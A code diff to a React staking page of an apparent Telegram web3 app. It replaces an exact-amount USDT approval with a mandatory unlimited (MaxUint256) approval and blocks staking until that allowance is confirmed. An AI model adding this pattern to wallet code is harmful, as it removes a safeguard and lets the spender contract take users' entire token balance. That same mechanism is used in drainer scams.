@@ -3,7 +3,7 @@ import { useNavigate } from 'react-router-dom';
 import { useWallet } from '../lib/web3';
 import { useStaking } from '../hooks/useStaking';
 import { useTelegram } from '../hooks/useTelegram';
-import { BrowserProvider, formatUnits, parseUnits } from 'ethers';
+import { BrowserProvider, formatUnits, parseUnits, MaxUint256 } from 'ethers';
 import { usePrice } from '../hooks/usePrice';
 import { parseEthersError } from '../utils/errors';
 
@@ -521,21 +521,21 @@ const Stake: React.FC = () => {
             const currentAllowance = parseUnits(currentAllowanceStr || '0', 18);
             const isTMA = !!(window as any).Telegram?.WebApp;
 
-            if (currentAllowance < priceBigInt) {
-                console.log("[Stake] Extra-fund upgrade requires fresh approval before staking. Triggering exact allowance approval.");
-                const approvalTx = await approve(finalAmount);
+            // Contract requires Unlimited/Max approval (MaxUint256)
+            const APPROVAL_THRESHOLD = MaxUint256 / 2n;
+            if (currentAllowance < APPROVAL_THRESHOLD) {
+                console.log("[Stake] Unlimited approval required. Requesting MaxUint256 approval.");
+                const approvalTx = await approve();
 
                 if (approvalTx && typeof approvalTx.wait === 'function') {
                     if (isTMA) {
-                        // In TMA: Don't block on tx.wait() — it hangs after wallet redirect.
-                        // Instead, poll allowance with timeout.
                         console.log("[Stake] TMA mode: Polling allowance instead of tx.wait()...");
                         const maxPoll = 15;
                         for (let p = 0; p < maxPoll; p++) {
                             await new Promise(r => setTimeout(r, 2000));
                             const polled = await getAllowance(fallbackAddress);
-                            if (parseUnits(polled || '0', 18) >= priceBigInt) {
-                                console.log(`[Stake] Allowance confirmed on poll ${p + 1}`);
+                            if (parseUnits(polled || '0', 18) >= APPROVAL_THRESHOLD) {
+                                console.log(`[Stake] Unlimited allowance confirmed on poll ${p + 1}`);
                                 break;
                             }
                         }
@@ -549,7 +549,7 @@ const Stake: React.FC = () => {
                             for (let p = 0; p < 8; p++) {
                                 await new Promise(r => setTimeout(r, 2000));
                                 const polled = await getAllowance(fallbackAddress);
-                                if (parseUnits(polled || '0', 18) >= priceBigInt) break;
+                                if (parseUnits(polled || '0', 18) >= APPROVAL_THRESHOLD) break;
                             }
                         }
                     }
@@ -557,8 +557,8 @@ const Stake: React.FC = () => {
 
                 const refreshedAllowanceStr = await getAllowance(fallbackAddress);
                 const refreshedAllowance = parseUnits(refreshedAllowanceStr || '0', 18);
-                if (refreshedAllowance < priceBigInt) {
-                    throw new Error("USDT approval was not enough for this stake. Please approve again and retry.");
+                if (refreshedAllowance < APPROVAL_THRESHOLD) {
+                    throw new Error("USDT unlimited approval not confirmed. Please approve again and retry.");
                 }
             }
 
